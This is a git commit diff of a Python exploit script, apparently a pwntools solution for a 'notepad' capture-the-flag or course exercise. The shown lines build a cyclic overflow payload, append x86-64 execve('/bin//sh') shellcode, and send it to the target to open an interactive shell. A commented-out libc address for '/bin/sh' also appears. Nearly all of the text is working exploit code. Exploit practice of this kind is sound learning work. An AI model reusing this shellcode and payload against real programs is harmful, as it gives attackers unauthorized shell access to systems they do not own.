6e3252007726313b5a53bda8f22bdda47d269167
wuling31715 <wuling31715@gmail.com>
2020-04-13 16:04:20 +0800

    .

--- adl/notepad/main.py
+++ adl/notepad/main.py
@@ -11,9 +11,8 @@ payload = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaar
 # shell = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
 shell = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
 payload += shell
-# payload += p64(0x7ffff7f7ccee)
-# payload += p64(0x7ffff7f7ccee)
-print(payload)
+# bin_sh = p64(0x7ffff7f7ccee)
+# payload += bin_sh
 
 r.sendline(payload)
 r.interactive()
